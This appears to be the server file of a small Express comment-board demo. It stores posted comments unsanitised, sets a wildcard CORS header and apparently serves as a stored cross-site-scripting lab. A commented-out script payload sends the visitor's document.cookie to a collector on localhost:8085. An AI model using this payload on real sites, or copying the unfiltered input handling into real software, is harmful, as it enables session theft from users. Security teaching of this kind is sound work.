var express = require ('express'),
  bodyParser = require ('body-parser'),
  cookieParser = require ('cookie-parser'),
  serveStatic = require ('serve-static'),
  session = require ('express-session'),
  app = express (),
  comments = [
    'How can I become even 1/10th as awesome as Raghav? Is it even humanely possible?',
    'Vatsal is finishing all of this world\'s food',
    'Shubrika is a potato.',
    'Mridul stop tickling people they\'ll kill you one day',
    'Where can I hide a dead body? I need answer urgently (just out of curiosity, nothing else)'
  ];

  //<script>$.ajax({type: 'POST', data: JSON.stringify({userInfo: document.cookie}), contentType: 'application/json', url: 'http://localhost:8085/'});</script>

//------------------CORS-----------------------------------------------------------/
  app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
  });
//------------------CORS-----------------------------------------------------------/

app
  .use (bodyParser.json ())
  .use (serveStatic (__dirname))
  .set ('views', __dirname)
  .set ('view engine', 'ejs');

app
  .get ('/', function (req, res) {
    res.render ('index', {
      a: comments [0] || '',
      b: comments [1] || '',
      c: comments [2] || '',
      d: comments [3] || '',
      e: comments [4] || '',
    });
  })
  .post ('/comment', function (req, res) {
    comments.push (req.body.comment);
    comments.length > 5 ? comments.shift () : false;
    res.sendStatus (201);
  })
  .listen (8080, function () {
    console.log ('Web Server listening on port 8080');
  });
